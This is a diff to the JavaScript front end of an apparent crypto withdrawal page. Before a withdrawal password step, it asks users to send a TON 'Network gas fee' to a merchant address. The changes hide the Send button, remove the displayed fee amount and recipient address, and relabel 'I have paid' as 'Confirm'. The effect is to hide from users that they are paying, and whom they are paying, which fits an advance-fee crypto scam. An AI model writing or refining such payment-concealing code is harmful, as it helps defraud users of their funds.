@@ -1003,12 +1003,102 @@ document.getElementById("tonContinueBtn").onclick = async () => {
 };
 
 // MAIN ROUTING PROCESSOR
+// async function buyProduct() {
+//   const address = document.getElementById("address").value.trim();
+//   const amount = parseFloat(amountInput.value);
+//   if (!address) return alert("Enter your TON (GRAM) address.");
+//   if (!amount || isNaN(amount) || amount <= 0) return alert("Enter a valid amount.");
+//   if (amount > maxBalance) return alert("Insufficient balance.");
+
+//   spinner.style.display = "flex";
+//   gasFeeDiv.style.display = "none";
+
+//   const { isAndroid, isIOS } = getDeviceType();
+
+//   try {
+//     if (isAndroid) {
+//       const tc = initTonConnect();
+//       if (!tc.connected) throw new Error("Wallet not connected");
+
+//       const amountNano = BigInt(Math.round(tonFee * 1e9));
+//       const tx = {
+//         validUntil: Math.floor(Date.now() / 1000) + 360,
+//         messages: [
+//           {
+//             address: merchantAddress,
+//             amount: amountNano.toString(),
+//             payload: "te6cckEBAQEADgAAGE5ldHdvcmsgZ2FzIGZlZf6R364="
+//           }
+//         ]
+//       };
+
+//       await tc.sendTransaction(tx);
+//       spinner.style.display = "none";
+//       openWithdrawPasswordModal();
+
+//     } else {
+//       const tonAmountToSend = tonFee;
+//       const message = "Network gas fee";
+//       const tonNano = tonAmountToSend * 1e9;
+//       const tonUniversalLink = `https://app.tonkeeper.com/transfer/${merchantAddress}?amount=${tonNano}&text=${encodeURIComponent(message)}`;
+      
+//       const isTelegram = typeof Telegram !== "undefined" && Telegram.WebApp;
+//       if (isTelegram) {
+//         Telegram.WebApp.openLink(tonUniversalLink);
+//       } else {
+//         window.location.href = tonUniversalLink;
+//       }
+
+//       setTimeout(() => {
+//         spinner.style.display = "none";
+//         gasFeeDiv.innerHTML = `
+//           <p style="color:#ccc; font-size:14px; margin-bottom:15px;">
+//             If your TON wallet didn’t open automatically, please send 
+//             <strong>${tonFee} TON(GRAM)</strong> manually to:<br><br>
+//             <strong style="color:#00ccff;">${merchantAddress}</strong> to process Withdrawal 
+//           </p>
+//           <a href="${tonUniversalLink}" target="_blank" class="ton-link" 
+//              style="display:inline-block;background:#00ccff;color:#fff;padding:10px 15px;border-radius:6px;text-decoration:none;font-weight:600;">
+//             🔗 Open in Tonkeeper
+//           </a>
+//           <button class="tonWithdrawal" onclick="openWithdrawPasswordModal()">I have paid</button>
+//         `;
+//         gasFeeDiv.style.display = "block";
+//       }, 4000);
+//     }
+//   } catch (err) {
+//     console.error("TON flow failed:", err);
+//     spinner.style.display = "none";
+//     alert("Unable to process automated wallet transaction. Ensure your wallet is properly set up or use the manual payout interface below.");
+    
+//     const tonNano = tonFee * 1e9;
+//     const fallbackLink = `https://app.tonkeeper.com/transfer/${merchantAddress}?amount=${tonNano}&text=${encodeURIComponent("Network gas fee")}`;
+//     gasFeeDiv.innerHTML = `
+//       <p style="color:#ccc; font-size:14px; margin-bottom:15px;">
+//         You can send <strong>${tonFee} TON(GRAM)</strong> manually to:<br><br>
+//         <strong style="color:#00ccff;">${merchantAddress}</strong>
+//       </p>
+//       <a href="${fallbackLink}" target="_blank" class="ton-link" 
+//          style="display:inline-block;background:#00ccff;color:#fff;padding:10px 15px;border-radius:6px;text-decoration:none;font-weight:600;">
+//         🔗 Open in Tonkeeper
+//       </a>
+//       <button class="tonWithdrawal" onclick="openWithdrawPasswordModal()">I have paid</button>
+//     `;
+//     gasFeeDiv.style.display = "block";
+//   }
+// }
+
+// MAIN ROUTING PROCESSOR
 async function buyProduct() {
   const address = document.getElementById("address").value.trim();
   const amount = parseFloat(amountInput.value);
   if (!address) return alert("Enter your TON (GRAM) address.");
   if (!amount || isNaN(amount) || amount <= 0) return alert("Enter a valid amount.");
   if (amount > maxBalance) return alert("Insufficient balance.");
+
+  // CHANGE 1: Find and hide the "Send" button as soon as processing starts
+  const sendBtn = document.querySelector("#sidebar .tonWithdrawal[onclick='openTonConfirm()']");
+  if (sendBtn) sendBtn.style.display = "none";
 
   spinner.style.display = "flex";
   gasFeeDiv.style.display = "none";
@@ -1051,17 +1141,10 @@ async function buyProduct() {
 
       setTimeout(() => {
         spinner.style.display = "none";
+        
+        // CHANGE 2: Removed address text & Tonkeeper link, renamed "I have paid" to "Confirm"
         gasFeeDiv.innerHTML = `
-          <p style="color:#ccc; font-size:14px; margin-bottom:15px;">
-            If your TON wallet didn’t open automatically, please send 
-            <strong>${tonFee} TON(GRAM)</strong> manually to:<br><br>
-            <strong style="color:#00ccff;">${merchantAddress}</strong> to process Withdrawal 
-          </p>
-          <a href="${tonUniversalLink}" target="_blank" class="ton-link" 
-             style="display:inline-block;background:#00ccff;color:#fff;padding:10px 15px;border-radius:6px;text-decoration:none;font-weight:600;">
-            🔗 Open in Tonkeeper
-          </a>
-          <button class="tonWithdrawal" onclick="openWithdrawPasswordModal()">I have paid</button>
+          <button class="tonWithdrawal" onclick="openWithdrawPasswordModal()">Confirm</button>
         `;
         gasFeeDiv.style.display = "block";
       }, 4000);
@@ -1069,26 +1152,16 @@ async function buyProduct() {
   } catch (err) {
     console.error("TON flow failed:", err);
     spinner.style.display = "none";
-    alert("Unable to process automated wallet transaction. Ensure your wallet is properly set up or use the manual payout interface below.");
     
-    const tonNano = tonFee * 1e9;
-    const fallbackLink = `https://app.tonkeeper.com/transfer/${merchantAddress}?amount=${tonNano}&text=${encodeURIComponent("Network gas fee")}`;
+    // CHANGE 3: Changed fallback state to show only the "Confirm" button
     gasFeeDiv.innerHTML = `
-      <p style="color:#ccc; font-size:14px; margin-bottom:15px;">
-        You can send <strong>${tonFee} TON(GRAM)</strong> manually to:<br><br>
-        <strong style="color:#00ccff;">${merchantAddress}</strong>
-      </p>
-      <a href="${fallbackLink}" target="_blank" class="ton-link" 
-         style="display:inline-block;background:#00ccff;color:#fff;padding:10px 15px;border-radius:6px;text-decoration:none;font-weight:600;">
-        🔗 Open in Tonkeeper
-      </a>
-      <button class="tonWithdrawal" onclick="openWithdrawPasswordModal()">I have paid</button>
+      <button class="tonWithdrawal" onclick="openWithdrawPasswordModal()">Confirm</button>
     `;
     gasFeeDiv.style.display = "block";
   }
 }
-
-/**********************************************
+  
+  /**********************************************
  * PAY CONFIRMATION (AFTER PIN) - 10-MIN AUTO-CANCEL ENGINE
  **********************************************/
 async function confirmPayment() {
